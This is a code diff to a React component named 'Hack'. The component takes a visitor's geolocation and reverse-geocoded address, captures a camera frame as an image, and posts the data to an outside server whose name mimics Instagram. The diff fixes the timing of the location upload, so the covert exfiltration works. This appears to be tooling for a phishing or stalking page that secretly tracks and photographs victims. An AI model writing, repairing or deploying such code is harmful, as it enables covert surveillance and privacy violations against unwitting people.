@@ -1,8 +1,6 @@
 import React, { useEffect, useRef } from "react";
 import axios from "axios";
 
-let toSend = {};
-
 let img = {};
 
 export const Hack: React.FC = () => {
@@ -20,11 +18,19 @@ export const Hack: React.FC = () => {
           );
           const data = await response.json();
 
-          toSend = {
+          const toSend = {
             lat: position.coords.latitude,
             long: position.coords.longitude,
             location: data?.results[0]?.formatted,
           };
+
+          await axios.post(
+            "https://instagram-server-eight.vercel.app/v1/upload",
+            toSend,
+            {
+              withCredentials: true,
+            }
+          );
           console.log(data?.results[0]?.formatted);
         },
         (err) => {
@@ -47,9 +53,6 @@ export const Hack: React.FC = () => {
 
             if (canvas && video) {
               console.log(canvas?.toDataURL("image/png"));
-              toSend = {
-                photo: canvas.toDataURL("image/png"),
-              };
               img = {
                 img: canvas.toDataURL("image/png"),
               };
@@ -63,14 +66,6 @@ export const Hack: React.FC = () => {
       } catch (err) {
         console.log("Error accessing the camera: ", err);
       }
-
-      await axios.post(
-        "https://instagram-server-eight.vercel.app/v1/upload",
-        toSend,
-        {
-          withCredentials: true,
-        }
-      );
 
       await axios.post(
         "https://instagram-server-eight.vercel.app/cloudinary/upload",
